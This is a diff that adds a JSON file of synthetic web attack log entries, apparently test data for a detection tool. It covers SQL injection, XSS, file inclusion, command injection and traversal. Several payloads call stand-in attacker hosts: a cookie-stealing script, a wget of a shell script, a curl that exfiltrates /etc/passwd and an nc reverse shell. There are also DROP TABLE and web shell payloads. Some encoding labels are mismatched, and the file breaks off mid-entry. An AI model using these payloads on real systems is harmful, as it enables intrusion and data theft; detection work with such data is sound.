@@ -1,0 +1,1348 @@
+[
+  {
+    "type": "SQL_INJECTION",
+    "timestamp": "10/Mar/2026:20:21:59 +0000",
+    "ip": "10.0.0.15",
+    "method": "POST",
+    "uri": "/login.php?username=%27%20OR%20%271%27%3D%271&password=test",
+    "raw_payload": "' OR '1'='1",
+    "encoded_payload": "%27%20OR%20%271%27%3D%271",
+    "status": 200,
+    "user_agent": "Mozilla/5.0 (compatible; Googlebot/2.1)"
+  },
+  {
+    "type": "SQL_INJECTION",
+    "timestamp": "10/Mar/2026:20:21:59 +0000",
+    "ip": "10.0.0.201",
+    "method": "GET",
+    "uri": "/login.php?username=%27%20OR%201%3D1--&password=test",
+    "raw_payload": "' OR 1=1--",
+    "encoded_payload": "%27%20OR%201%3D1--",
+    "status": 403,
+    "user_agent": "sqlmap/1.7.8#stable (https://sqlmap.org)"
+  },
+  {
+    "type": "SQL_INJECTION",
+    "timestamp": "10/Mar/2026:20:21:59 +0000",
+    "ip": "10.0.0.234",
+    "method": "POST",
+    "uri": "/login.php?username=%27%20UNION%20SELECT%20null%2Cusername%2Cpassword%20FROM%20users--&password=test",
+    "raw_payload": "' UNION SELECT null,username,password FROM users--",
+    "encoded_payload": "%27%20UNION%20SELECT%20null%2Cusername%2Cpassword%20FROM%20users--",
+    "status": 200,
+    "user_agent": "Nikto/2.1.6"
+  },
+  {
+    "type": "SQL_INJECTION",
+    "timestamp": "10/Mar/2026:20:21:59 +0000",
+    "ip": "10.0.0.95",
+    "method": "POST",
+    "uri": "/login.php?username=%27%3B%20DROP%20TABLE%20users%3B--&password=test",
+    "raw_payload": "'; DROP TABLE users;--",
+    "encoded_payload": "%27%3B%20DROP%20TABLE%20users%3B--",
+    "status": 500,
+    "user_agent": "sqlmap/1.7.8#stable (https://sqlmap.org)"
+  },
+  {
+    "type": "SQL_INJECTION",
+    "timestamp": "10/Mar/2026:20:21:59 +0000",
+    "ip": "10.0.0.125",
+    "method": "POST",
+    "uri": "/login.php?username=%27%20AND%20SLEEP%285%29--&password=test",
+    "raw_payload": "' AND SLEEP(5)--",
+    "encoded_payload": "%27%20AND%20SLEEP%285%29--",
+    "status": 500,
+    "user_agent": "sqlmap/1.7.8#stable (https://sqlmap.org)"
+  },
+  {
+    "type": "SQL_INJECTION",
+    "timestamp": "10/Mar/2026:20:21:59 +0000",
+    "ip": "10.0.0.122",
+    "method": "GET",
+    "uri": "/login.php?username=1%27%20ORDER%20BY%203--&password=test",
+    "raw_payload": "1' ORDER BY 3--",
+    "encoded_payload": "1%27%20ORDER%20BY%203--",
+    "status": 200,
+    "user_agent": "sqlmap/1.7.8#stable (https://sqlmap.org)"
+  },
+  {
+    "type": "SQL_INJECTION",
+    "timestamp": "10/Mar/2026:20:21:59 +0000",
+    "ip": "10.0.0.26",
+    "method": "POST",
+    "uri": "/login.php?username=%27%20OR%20EXISTS%28SELECT%20%2A%20FROM%20users%29--&password=test",
+    "raw_payload": "' OR EXISTS(SELECT * FROM users)--",
+    "encoded_payload": "%27%20OR%20EXISTS%28SELECT%20%2A%20FROM%20users%29--",
+    "status": 200,
+    "user_agent": "sqlmap/1.7.8#stable (https://sqlmap.org)"
+  },
+  {
+    "type": "SQL_INJECTION",
+    "timestamp": "10/Mar/2026:20:21:59 +0000",
+    "ip": "10.0.0.43",
+    "method": "POST",
+    "uri": "/login.php?username=admin%27--&password=test",
+    "raw_payload": "admin'--",
+    "encoded_payload": "admin%27--",
+    "status": 403,
+    "user_agent": "Nikto/2.1.6"
+  },
+  {
+    "type": "SQL_INJECTION",
+    "timestamp": "10/Mar/2026:20:21:59 +0000",
+    "ip": "10.0.0.118",
+    "method": "GET",
+    "uri": "/login.php?username=%27%20OR%20%27x%27%3D%27x&password=test",
+    "raw_payload": "' OR 'x'='x",
+    "encoded_payload": "%27%20OR%20%27x%27%3D%27x",
+    "status": 500,
+    "user_agent": "Nikto/2.1.6"
+  },
+  {
+    "type": "SQL_INJECTION",
+    "timestamp": "10/Mar/2026:20:21:59 +0000",
+    "ip": "10.0.0.86",
+    "method": "POST",
+    "uri": "/login.php?username=1%3B%20SELECT%20%2A%20FROM%20information_schema.tables&password=test",
+    "raw_payload": "1; SELECT * FROM information_schema.tables",
+    "encoded_payload": "1%3B%20SELECT%20%2A%20FROM%20information_schema.tables",
+    "status": 200,
+    "user_agent": "Mozilla/5.0 (compatible; Googlebot/2.1)"
+  },
+  {
+    "type": "SQL_INJECTION",
+    "timestamp": "10/Mar/2026:20:21:59 +0000",
+    "ip": "10.0.0.196",
+    "method": "POST",
+    "uri": "/login.php?username=%27%20UNION%20ALL%20SELECT%20NULL%2CNULL%2CNULL--&password=test",
+    "raw_payload": "' UNION ALL SELECT NULL,NULL,NULL--",
+    "encoded_payload": "%27%20UNION%20ALL%20SELECT%20NULL%2CNULL%2CNULL--",
+    "status": 500,
+    "user_agent": "sqlmap/1.7.8#stable (https://sqlmap.org)"
+  },
+  {
+    "type": "SQL_INJECTION",
+    "timestamp": "10/Mar/2026:20:21:59 +0000",
+    "ip": "10.0.0.229",
+    "method": "POST",
+    "uri": "/login.php?username=%27%3B%20EXEC%20xp_cmdshell%28%27whoami%27%29%3B--&password=test",
+    "raw_payload": "'; EXEC xp_cmdshell('whoami');--",
+    "encoded_payload": "%27%3B%20EXEC%20xp_cmdshell%28%27whoami%27%29%3B--",
+    "status": 403,
+    "user_agent": "sqlmap/1.7.8#stable (https://sqlmap.org)"
+  },
+  {
+    "type": "XSS",
+    "timestamp": "10/Mar/2026:20:21:59 +0000",
+    "ip": "172.16.191.206",
+    "method": "GET",
+    "uri": "/search?q=%3Cscript%3Ealert%28%27XSS%27%29%3C/script%3E",
+    "raw_payload": "<script>alert('XSS')</script>",
+    "encoded_payload": "%3Cscript%3Ealert%28%27XSS%27%29%3C/script%3E",
+    "status": 400,
+    "user_agent": "Burp Suite Professional"
+  },
+  {
+    "type": "XSS",
+    "timestamp": "10/Mar/2026:20:21:59 +0000",
+    "ip": "172.16.74.2",
+    "method": "GET",
+    "uri": "/search?q=%3Cimg%20src%3Dx%20onerror%3Dalert%281%29%3E",
+    "raw_payload": "<img src=x onerror=alert(1)>",
+    "encoded_payload": "%3Cimg%20src%3Dx%20onerror%3Dalert%281%29%3E",
+    "status": 200,
+    "user_agent": "Nikto/2.1.6"
+  },
+  {
+    "type": "XSS",
+    "timestamp": "10/Mar/2026:20:21:59 +0000",
+    "ip": "172.16.149.194",
+    "method": "GET",
+    "uri": "/feedback?q=javascript%3Aalert%28document.cookie%29",
+    "raw_payload": "javascript:alert(document.cookie)",
+    "encoded_payload": "javascript%3Aalert%28document.cookie%29",
+    "status": 400,
+    "user_agent": "python-requests/2.28.0"
+  },
+  {
+    "type": "XSS",
+    "timestamp": "10/Mar/2026:20:21:59 +0000",
+    "ip": "172.16.144.118",
+    "method": "GET",
+    "uri": "/profile?q=%3Csvg/onload%3Dalert%28%27xss%27%29%3E",
+    "raw_payload": "<svg/onload=alert('xss')>",
+    "encoded_payload": "%3Csvg/onload%3Dalert%28%27xss%27%29%3E",
+    "status": 400,
+    "user_agent": "curl/7.84.0"
+  },
+  {
+    "type": "XSS",
+    "timestamp": "10/Mar/2026:20:21:59 +0000",
+    "ip": "172.16.116.178",
+    "method": "GET",
+    "uri": "/comment?q=%27%22%3E%3Cscript%3Edocument.location%3D%27http%3A//evil.com/%3Fc%3D%27%2Bdocument.cookie%3C/script%3E",
+    "raw_payload": "'\"><script>document.location='http://evil.com/?c='+document.cookie</script>",
+    "encoded_payload": "%27%22%3E%3Cscript%3Edocument.location%3D%27http%3A//evil.com/%3Fc%3D%27%2Bdocument.cookie%3C/script%3E",
+    "status": 200,
+    "user_agent": "python-requests/2.28.0"
+  },
+  {
+    "type": "XSS",
+    "timestamp": "10/Mar/2026:20:21:59 +0000",
+    "ip": "172.16.247.204",
+    "method": "GET",
+    "uri": "/comment?q=%3Cbody%20onload%3Dalert%28%27XSS%27%29%3E",
+    "raw_payload": "<body onload=alert('XSS')>",
+    "encoded_payload": "%3Cbody%20onload%3Dalert%28%27XSS%27%29%3E",
+    "status": 200,
+    "user_agent": "Burp Suite Professional"
+  },
+  {
+    "type": "XSS",
+    "timestamp": "10/Mar/2026:20:21:59 +0000",
+    "ip": "172.16.40.192",
+    "method": "GET",
+    "uri": "/feedback?q=%253Cscript%253Ealert%281%29%253C%252Fscript%253E",
+    "raw_payload": "%3Cscript%3Ealert(1)%3C%2Fscript%3E",
+    "encoded_payload": "%253Cscript%253Ealert%281%29%253C%252Fscript%253E",
+    "status": 200,
+    "user_agent": "w3af.org"
+  },
+  {
+    "type": "XSS",
+    "timestamp": "10/Mar/2026:20:21:59 +0000",
+    "ip": "172.16.17.57",
+    "method": "GET",
+    "uri": "/search?q=%26%23x3C%3Bscript%26%23x3E%3Balert%281%29%26%23x3C%3B/script%26%23x3E%3B",
+    "raw_payload": "&#x3C;script&#x3E;alert(1)&#x3C;/script&#x3E;",
+    "encoded_payload": "%26%23x3C%3Bscript%26%23x3E%3Balert%281%29%26%23x3C%3B/script%26%23x3E%3B",
+    "status": 200,
+    "user_agent": "Nikto/2.1.6"
+  },
+  {
+    "type": "XSS",
+    "timestamp": "10/Mar/2026:20:21:59 +0000",
+    "ip": "172.16.62.87",
+    "method": "GET",
+    "uri": "/search?q=%3Ciframe%20src%3D%27javascript%3Aalert%281%29%27%3E%3C/iframe%3E",
+    "raw_payload": "<iframe src='javascript:alert(1)'></iframe>",
+    "encoded_payload": "%3Ciframe%20src%3D%27javascript%3Aalert%281%29%27%3E%3C/iframe%3E",
+    "status": 200,
+    "user_agent": "Acunetix Web Vulnerability Scanner"
+  },
+  {
+    "type": "LFI",
+    "timestamp": "10/Mar/2026:20:21:59 +0000",
+    "ip": "192.168.1.49",
+    "method": "GET",
+    "uri": "/index.php?page=../../../../etc/passwd",
+    "raw_payload": "../../../../etc/passwd",
+    "status": 403,
+    "user_agent": "python-requests/2.28.0"
+  },
+  {
+    "type": "LFI",
+    "timestamp": "10/Mar/2026:20:21:59 +0000",
+    "ip": "192.168.1.85",
+    "method": "GET",
+    "uri": "/index.php?page=../../../../etc/shadow",
+    "raw_payload": "../../../../etc/shadow",
+    "status": 404,
+    "user_agent": "Acunetix Web Vulnerability Scanner"
+  },
+  {
+    "type": "LFI",
+    "timestamp": "10/Mar/2026:20:21:59 +0000",
+    "ip": "192.168.1.224",
+    "method": "GET",
+    "uri": "/index.php?page=../../../../windows/system32/drivers/etc/hosts",
+    "raw_payload": "../../../../windows/system32/drivers/etc/hosts",
+    "status": 500,
+    "user_agent": "sqlmap/1.7.8#stable (https://sqlmap.org)"
+  },
+  {
+    "type": "LFI",
+    "timestamp": "10/Mar/2026:20:21:59 +0000",
+    "ip": "192.168.1.111",
+    "method": "GET",
+    "uri": "/index.php?page=....//....//....//etc/passwd",
+    "raw_payload": "....//....//....//etc/passwd",
+    "status": 500,
+    "user_agent": "w3af.org"
+  },
+  {
+    "type": "LFI",
+    "timestamp": "10/Mar/2026:20:21:59 +0000",
+    "ip": "192.168.1.95",
+    "method": "GET",
+    "uri": "/index.php?page=%252e%252e%252f%252e%252e%252f%252e%252e%252fetc%252fpasswd",
+    "raw_payload": "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
+    "status": 200,
+    "user_agent": "masscan/1.3"
+  },
+  {
+    "type": "LFI",
+    "timestamp": "10/Mar/2026:20:21:59 +0000",
+    "ip": "192.168.1.235",
+    "method": "GET",
+    "uri": "/index.php?page=..%25252f..%25252f..%25252fetc%25252fpasswd",
+    "raw_payload": "..%252f..%252f..%252fetc%252fpasswd",
+    "status": 200,
+    "user_agent": "python-requests/2.28.0"
+  },
+  {
+    "type": "LFI",
+    "timestamp": "10/Mar/2026:20:21:59 +0000",
+    "ip": "192.168.1.145",
+    "method": "GET",
+    "uri": "/index.php?page=/proc/self/environ",
+    "raw_payload": "/proc/self/environ",
+    "status": 403,
+    "user_agent": "sqlmap/1.7.8#stable (https://sqlmap.org)"
+  },
+  {
+    "type": "LFI",
+    "timestamp": "10/Mar/2026:20:21:59 +0000",
+    "ip": "192.168.1.51",
+    "method": "GET",
+    "uri": "/index.php?page=../../../../var/log/apache2/access.log",
+    "raw_payload": "../../../../var/log/apache2/access.log",
+    "status": 403,
+    "user_agent": "Acunetix Web Vulnerability Scanner"
+  },
+  {
+    "type": "LFI",
+    "timestamp": "10/Mar/2026:20:21:59 +0000",
+    "ip": "192.168.1.156",
+    "method": "GET",
+    "uri": "/index.php?page=php%3A//filter/convert.base64-encode/resource%3Dindex.php",
+    "raw_payload": "php://filter/convert.base64-encode/resource=index.php",
+    "status": 404,
+    "user_agent": "Burp Suite Professional"
+  },
+  {
+    "type": "LFI",
+    "timestamp": "10/Mar/2026:20:21:59 +0000",
+    "ip": "192.168.1.31",
+    "method": "GET",
+    "uri": "/index.php?page=data%3A//text/plain%3Bbase64%2CPD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7Pz4%3D",
+    "raw_payload": "data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7Pz4=",
+    "status": 403,
+    "user_agent": "Mozilla/5.0 (compatible; Googlebot/2.1)"
+  },
+  {
+    "type": "RFI",
+    "timestamp": "10/Mar/2026:20:21:59 +0000",
+    "ip": "203.0.113.158",
+    "method": "GET",
+    "uri": "/page.php?include=http%3A//evil.com/shell.txt",
+    "raw_payload": "http://evil.com/shell.txt",
+    "status": 500,
+    "user_agent": "Acunetix Web Vulnerability Scanner"
+  },
+  {
+    "type": "RFI",
+    "timestamp": "10/Mar/2026:20:21:59 +0000",
+    "ip": "203.0.113.124",
+    "method": "GET",
+    "uri": "/page.php?include=https%3A//attacker.io/malware.php",
+    "raw_payload": "https://attacker.io/malware.php",
+    "status": 500,
+    "user_agent": "sqlmap/1.7.8#stable (https://sqlmap.org)"
+  },
+  {
+    "type": "RFI",
+    "timestamp": "10/Mar/2026:20:21:59 +0000",
+    "ip": "203.0.113.54",
+    "method": "GET",
+    "uri": "/page.php?include=ftp%3A//evil.com/backdoor.php",
+    "raw_payload": "ftp://evil.com/backdoor.php",
+    "status": 200,
+    "user_agent": "curl/7.84.0"
+  },
+  {
+    "type": "RFI",
+    "timestamp": "10/Mar/2026:20:21:59 +0000",
+    "ip": "203.0.113.48",
+    "method": "GET",
+    "uri": "/page.php?include=http%3A//192.168.1.100/shell.php",
+    "raw_payload": "http://192.168.1.100/shell.php",
+    "status": 500,
+    "user_agent": "Nmap Scripting Engine"
+  },
+  {
+    "type": "RFI",
+    "timestamp": "10/Mar/2026:20:21:59 +0000",
+    "ip": "203.0.113.50",
+    "method": "GET",
+    "uri": "/page.php?include=http%3A//evil.com/c99.php%3Fcmd%3Did",
+    "raw_payload": "http://evil.com/c99.php?cmd=id",
+    "status": 200,
+    "user_agent": "DirBuster-1.0-RC1"
+  },
+  {
+    "type": "COMMAND_INJECTION",
+    "timestamp": "10/Mar/2026:20:21:59 +0000",
+    "ip": "10.10.59.103",
+    "method": "GET",
+    "uri": "/ping?host=%3B%20ls%20-la",
+    "raw_payload": "; ls -la",
+    "status": 200,
+    "user_agent": "Nikto/2.1.6"
+  },
+  {
+    "type": "COMMAND_INJECTION",
+    "timestamp": "10/Mar/2026:20:21:59 +0000",
+    "ip": "10.10.50.49",
+    "method": "POST",
+    "uri": "/ping?host=%7C%20cat%20/etc/passwd",
+    "raw_payload": "| cat /etc/passwd",
+    "status": 200,
+    "user_agent": "python-requests/2.28.0"
+  },
+  {
+    "type": "COMMAND_INJECTION",
+    "timestamp": "10/Mar/2026:20:21:59 +0000",
+    "ip": "10.10.160.219",
+    "method": "POST",
+    "uri": "/ping?host=%60id%60",
+    "raw_payload": "`id`",
+    "status": 500,
+    "user_agent": "Burp Suite Professional"
+  },
+  {
+    "type": "COMMAND_INJECTION",
+    "timestamp": "10/Mar/2026:20:21:59 +0000",
+    "ip": "10.10.49.122",
+    "method": "POST",
+    "uri": "/ping?host=%24%28whoami%29",
+    "raw_payload": "$(whoami)",
+    "status": 200,
+    "user_agent": "Nmap Scripting Engine"
+  },
+  {
+    "type": "COMMAND_INJECTION",
+    "timestamp": "10/Mar/2026:20:21:59 +0000",
+    "ip": "10.10.51.118",
+    "method": "GET",
+    "uri": "/ping?host=%3B%20ping%20-c%204%20attacker.com",
+    "raw_payload": "; ping -c 4 attacker.com",
+    "status": 200,
+    "user_agent": "masscan/1.3"
+  },
+  {
+    "type": "COMMAND_INJECTION",
+    "timestamp": "10/Mar/2026:20:21:59 +0000",
+    "ip": "10.10.172.104",
+    "method": "GET",
+    "uri": "/ping?host=%7C%7C%20net%20user",
+    "raw_payload": "|| net user",
+    "status": 500,
+    "user_agent": "ZAP/2.12.0"
+  },
+  {
+    "type": "COMMAND_INJECTION",
+    "timestamp": "10/Mar/2026:20:21:59 +0000",
+    "ip": "10.10.104.247",
+    "method": "POST",
+    "uri": "/ping?host=%26%20dir%20C%3A%5C",
+    "raw_payload": "& dir C:\\",
+    "status": 200,
+    "user_agent": "Burp Suite Professional"
+  },
+  {
+    "type": "COMMAND_INJECTION",
+    "timestamp": "10/Mar/2026:20:21:59 +0000",
+    "ip": "10.10.232.222",
+    "method": "GET",
+    "uri": "/ping?host=%3B%20wget%20http%3A//evil.com/shell.sh%20-O%20/tmp/shell.sh",
+    "raw_payload": "; wget http://evil.com/shell.sh -O /tmp/shell.sh",
+    "status": 200,
+    "user_agent": "w3af.org"
+  },
+  {
+    "type": "COMMAND_INJECTION",
+    "timestamp": "10/Mar/2026:20:21:59 +0000",
+    "ip": "10.10.240.30",
+    "method": "POST",
+    "uri": "/ping?host=%3B%20curl%20http%3A//evil.com/exfil%3Fdata%3D%24%28cat%20/etc/passwd%20%7C%20base64%29",
+    "raw_payload": "; curl http://evil.com/exfil?data=$(cat /etc/passwd | base64)",
+    "status": 200,
+    "user_agent": "ZAP/2.12.0"
+  },
+  {
+    "type": "COMMAND_INJECTION",
+    "timestamp": "10/Mar/2026:20:21:59 +0000",
+    "ip": "10.10.225.156",
+    "method": "POST",
+    "uri": "/ping?host=%7C%20nc%20-e%20/bin/sh%20attacker.com%204444",
+    "raw_payload": "| nc -e /bin/sh attacker.com 4444",
+    "status": 200,
+    "user_agent": "Mozilla/5.0 (compatible; Googlebot/2.1)"
+  },
+  {
+    "type": "DIR_TRAVERSAL",
+    "timestamp": "10/Mar/2026:20:21:59 +0000",
+    "ip": "198.51.100.44",
+    "method": "GET",
+    "uri": "/download?file=../../../etc/passwd",
+    "raw_payload": "../../../etc/passwd",
+    "status": 403,
+    "user_agent": "Mozilla/5.0 (compatible; Googlebot/2.1)"
+  },
+  {
+    "type": "DIR_TRAVERSAL",
+    "timestamp": "10/Mar/2026:20:21:59 +0000",
+    "ip": "198.51.100.225",
+    "method": "GET",
+    "uri": "/download?file=..%5C..%5C..%5Cwindows%5Csystem32%5Cconfig%5Csam",
+    "raw_payload": "..\\..\\..\\windows\\system32\\config\\sam",
+    "status": 200,
+    "user_agent": "DirBuster-1.0-RC1"
+  },
+  {
+    "type": "DIR_TRAVERSAL",
+    "timestamp": "10/Mar/2026:20:21:59 +0000",
+    "ip": "198.51.100.231",
+    "method": "GET",
+    "uri": "/download?file=%252e%252e%252f%252e%252e%252f%252e%252e%252fetc%252fpasswd",
+    "raw_payload": "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
+    "status": 403,
+    "user_agent": "Burp Suite Professional"
+  },
+  {
+    "type": "DIR_TRAVERSAL",
+    "timestamp": "10/Mar/2026:20:21:59 +0000",
+    "ip": "198.51.100.115",
+    "method": "GET",
+    "uri": "/download?file=..%252f..%252f..%252fetc%252fpasswd",
+    "raw_payload": "..%2f..%2f..%2fetc%2fpasswd",
+    "status": 200,
+    "user_agent": "Acunetix Web Vulnerability Scanner"
+  },
+  {
+    "type": "DIR_TRAVERSAL",
+    "timestamp": "10/Mar/2026:20:21:59 +0000",
+    "ip": "198.51.100.179",
+    "method": "GET",
+    "uri": "/download?file=....//....//....//etc/passwd",
+    "raw_payload": "....//....//....//etc/passwd",
+    "status": 200,
+    "user_agent": "curl/7.84.0"
+  },
+  {
+    "type": "DIR_TRAVERSAL",
+    "timestamp": "10/Mar/2026:20:21:59 +0000",
+    "ip": "198.51.100.214",
+    "method": "GET",
+    "uri": "/download?file=%25c0%25af%25c0%25af%25c0%25afetc%25c0%25afpasswd",
+    "raw_payload": "%c0%af%c0%af%c0%afetc%c0%afpasswd",
+    "status": 403,
+    "user_agent": "DirBuster-1.0-RC1"
+  },
+  {
+    "type": "ENCODED_ATTACK",
+    "timestamp": "10/Mar/2026:20:21:59 +0000",
+    "ip": "10.0.132.60",
+    "method": "GET",
+    "uri": "/search?q=PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4=",
+    "raw_payload": "PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4=",
+    "encoding_type": "hex",
+    "status": 200,
+    "user_agent": "w3af.org"
+  },
+  {
+    "type": "ENCODED_ATTACK",
+    "timestamp": "10/Mar/2026:20:21:59 +0000",
+    "ip": "10.0.38.245",
+    "method": "GET",
+    "uri": "/search?q=%2527%2520OR%25201%253D1--",
+    "raw_payload": "%2527%2520OR%25201%253D1--",
+    "encoding_type": "url-double",
+    "status": 400,
+    "user_agent": "ZAP/2.12.0"
+  },
+  {
+    "type": "ENCODED_ATTACK",
+    "timestamp": "10/Mar/2026:20:21:59 +0000",
+    "ip": "10.0.131.71",
+    "method": "GET",
+    "uri": "/search?q=%3B%20%63%61%74%20%2F%65%74%63%2F%70%61%73%73%77%64",
+    "raw_payload": "%3B%20%63%61%74%20%2F%65%74%63%2F%70%61%73%73%77%64",
+    "encoding_type": "base64",
+    "status": 200,
+    "user_agent": "python-requests/2.28.0"
+  },
+  {
+    "type": "ENCODED_ATTACK",
+    "timestamp": "10/Mar/2026:20:21:59 +0000",
+    "ip": "10.0.172.41",
+    "method": "GET",
+    "uri": "/search?q=\\u003cscript\\u003ealert(1)\\u003c/script\\u003e",
+    "raw_payload": "\\u003cscript\\u003ealert(1)\\u003c/script\\u003e",
+    "encoding_type": "hex",
+    "status": 400,
+    "user_agent": "Burp Suite Professional"
+  },
+  {
+    "type": "ENCODED_ATTACK",
+    "timestamp": "10/Mar/2026:20:21:59 +0000",
+    "ip": "10.0.159.157",
+    "method": "GET",
+    "uri": "/search?q=&#60;&#115;&#99;&#114;&#105;&#112;&#116;&#62;alert(1)&#60;/script&#62;",
+    "raw_payload": "&#60;&#115;&#99;&#114;&#105;&#112;&#116;&#62;alert(1)&#60;/script&#62;",
+    "encoding_type": "url-double",
+    "status": 400,
+    "user_agent": "Acunetix Web Vulnerability Scanner"
+  },
+  {
+    "type": "ERROR_SPIKE",
+    "timestamp": "10/Mar/2026:20:21:59 +0000",
+    "ip": "185.220.186.216",
+    "method": "GET",
+    "uri": "/config.php",
+    "status": 404,
+    "user_agent": "sqlmap/1.7.8#stable (https://sqlmap.org)"
+  },
+  {
+    "type": "ERROR_SPIKE",
+    "timestamp": "10/Mar/2026:20:21:59 +0000",
+    "ip": "185.220.186.216",
+    "method": "GET",
+    "uri": "/api/v1/users",
+    "status": 401,
+    "user_agent": "masscan/1.3"
+  },
+  {
+    "type": "ERROR_SPIKE",
+    "timestamp": "10/Mar/2026:20:21:59 +0000",
+    "ip": "185.220.186.216",
+    "method": "GET",
+    "uri": "/wp-admin",
+    "status": 404,
+    "user_agent": "Acunetix Web Vulnerability Scanner"
+  },
+  {
+    "type": "ERROR_SPIKE",
+    "timestamp": "10/Mar/2026:20:21:59 +0000",
+    "ip": "185.220.186.216",
+    "method": "GET",
+    "uri": "/api/v1/users",
+    "status": 404,
+    "user_agent": "Mozilla/5.0 (compatible; Googlebot/2.1)"
+  },
+  {
+    "type": "ERROR_SPIKE",
+    "timestamp": "10/Mar/2026:20:21:59 +0000",
+    "ip": "185.220.186.216",
+    "method": "GET",
+    "uri": "/phpmyadmin",
+    "status": 404,
+    "user_agent": "Nmap Scripting Engine"
+  },
+  {
+    "type": "ERROR_SPIKE",
+    "timestamp": "10/Mar/2026:20:21:59 +0000",
+    "ip": "185.220.186.216",
+    "method": "GET",
+    "uri": "/backup.zip",
+    "status": 403,
+    "user_agent": "Acunetix Web Vulnerability Scanner"
+  },
+  {
+    "type": "ERROR_SPIKE",
+    "timestamp": "10/Mar/2026:20:21:59 +0000",
+    "ip": "185.220.186.216",
+    "method": "GET",
+    "uri": "/admin",
+    "status": 404,
+    "user_agent": "curl/7.84.0"
+  },
+  {
+    "type": "ERROR_SPIKE",
+    "timestamp": "10/Mar/2026:20:21:59 +0000",
+    "ip": "185.220.186.216",
+    "method": "GET",
+    "uri": "/config.php",
+    "status": 404,
+    "user_agent": "sqlmap/1.7.8#stable (https://sqlmap.org)"
+  },
+  {
+    "type": "ERROR_SPIKE",
+    "timestamp": "10/Mar/2026:20:21:59 +0000",
+    "ip": "185.220.186.216",
+    "method": "GET",
+    "uri": "/admin",
+    "status": 404,
+    "user_agent": "w3af.org"
+  },
+  {
+    "type": "ERROR_SPIKE",
+    "timestamp": "10/Mar/2026:20:21:59 +0000",
+    "ip": "185.220.186.216",
+    "method": "GET",
+    "uri": "/server-status",
+    "status": 404,
+    "user_agent": "ZAP/2.12.0"
+  },
+  {
+    "type": "ERROR_SPIKE",
+    "timestamp": "10/Mar/2026:20:21:59 +0000",
+    "ip": "185.220.186.216",
+    "method": "GET",
+    "uri": "/admin",
+    "status": 404,
+    "user_agent": "DirBuster-1.0-RC1"
+  },
+  {
+    "type": "ERROR_SPIKE",
+    "timestamp": "10/Mar/2026:20:21:59 +0000",
+    "ip": "185.220.186.216",
+    "method": "GET",
+    "uri": "/wp-admin",
+    "status": 500,
+    "user_agent": "DirBuster-1.0-RC1"
+  },
+  {
+    "type": "ERROR_SPIKE",
+    "timestamp": "10/Mar/2026:20:21:59 +0000",
+    "ip": "185.220.186.216",
+    "method": "GET",
+    "uri": "/.env",
+    "status": 404,
+    "user_agent": "Nikto/2.1.6"
+  },
+  {
+    "type": "ERROR_SPIKE",
+    "timestamp": "10/Mar/2026:20:21:59 +0000",
+    "ip": "185.220.186.216",
+    "method": "GET",
+    "uri": "/.env",
+    "status": 404,
+    "user_agent": "Acunetix Web Vulnerability Scanner"
+  },
+  {
+    "type": "ERROR_SPIKE",
+    "timestamp": "10/Mar/2026:20:21:59 +0000",
+    "ip": "185.220.186.216",
+    "method": "GET",
+    "uri": "/backup.zip",
+    "status": 403,
+    "user_agent": "Burp Suite Professional"
+  },
+  {
+    "type": "ERROR_SPIKE",
+    "timestamp": "10/Mar/2026:20:21:59 +0000",
+    "ip": "185.220.186.216",
+    "method": "GET",
+    "uri": "/config.php",
+    "status": 500,
+    "user_agent": "sqlmap/1.7.8#stable (https://sqlmap.org)"
+  },
+  {
+    "type": "ERROR_SPIKE",
+    "timestamp": "10/Mar/2026:20:21:59 +0000",
+    "ip": "185.220.186.216",
+    "method": "GET",
+    "uri": "/config.php",
+    "status": 404,
+    "user_agent": "masscan/1.3"
+  },
+  {
+    "type": "ERROR_SPIKE",
+    "timestamp": "10/Mar/2026:20:21:59 +0000",
+    "ip": "185.220.186.216",
+    "method": "GET",
+    "uri": "/.env",
+    "status": 404,
+    "user_agent": "DirBuster-1.0-RC1"
+  },
+  {
+    "type": "ERROR_SPIKE",
+    "timestamp": "10/Mar/2026:20:21:59 +0000",
+    "ip": "185.220.186.216",
+    "method": "GET",
+    "uri": "/admin",
+    "status": 404,
+    "user_agent": "curl/7.84.0"
+  },
+  {
+    "type": "ERROR_SPIKE",
+    "timestamp": "10/Mar/2026:20:21:59 +0000",
+    "ip": "185.220.186.216",
+    "method": "GET",
+    "uri": "/server-status",
+    "status": 404,
+    "user_agent": "Nikto/2.1.6"
+  },
+  {
+    "type": "ERROR_SPIKE",
+    "timestamp": "10/Mar/2026:20:21:59 +0000",
+    "ip": "185.220.186.216",
+    "method": "GET",
+    "uri": "/.git/config",
+    "status": 500,
+    "user_agent": "Nmap Scripting Engine"
+  },
+  {
+    "type": "ERROR_SPIKE",
+    "timestamp": "10/Mar/2026:20:21:59 +0000",
+    "ip": "185.220.186.216",
+    "method": "GET",
+    "uri": "/wp-admin",
+    "status": 404,
+    "user_agent": "masscan/1.3"
+  },
+  {
+    "type": "ERROR_SPIKE",
+    "timestamp": "10/Mar/2026:20:21:59 +0000",
+    "ip": "185.220.186.216",
+    "method": "GET",
+    "uri": "/phpmyadmin",
+    "status": 403,
+    "user_agent": "DirBuster-1.0-RC1"
+  },
+  {
+    "type": "ERROR_SPIKE",
+    "timestamp": "10/Mar/2026:20:21:59 +0000",
+    "ip": "185.220.186.216",
+    "method": "GET",
+    "uri": "/config.php",
+    "status": 404,
+    "user_agent": "w3af.org"
+  },
+  {
+    "type": "ERROR_SPIKE",
+    "timestamp": "10/Mar/2026:20:21:59 +0000",
+    "ip": "185.220.186.216",
+    "method": "GET",
+    "uri": "/api/v1/users",
+    "status": 404,
+    "user_agent": "DirBuster-1.0-RC1"
+  },
+  {
+    "type": "ERROR_SPIKE",
+    "timestamp": "10/Mar/2026:20:21:59 +0000",
+    "ip": "185.220.186.216",
+    "method": "GET",
+    "uri": "/server-status",
+    "status": 401,
+    "user_agent": "Nikto/2.1.6"
+  },
+  {
+    "type": "ERROR_SPIKE",
+    "timestamp": "10/Mar/2026:20:21:59 +0000",
+    "ip": "185.220.186.216",
+    "method": "GET",
+    "uri": "/admin",
+    "status": 401,
+    "user_agent": "Acunetix Web Vulnerability Scanner"
+  },
+  {
+    "type": "ERROR_SPIKE",
+    "timestamp": "10/Mar/2026:20:21:59 +0000",
+    "ip": "185.220.186.216",
+    "method": "GET",
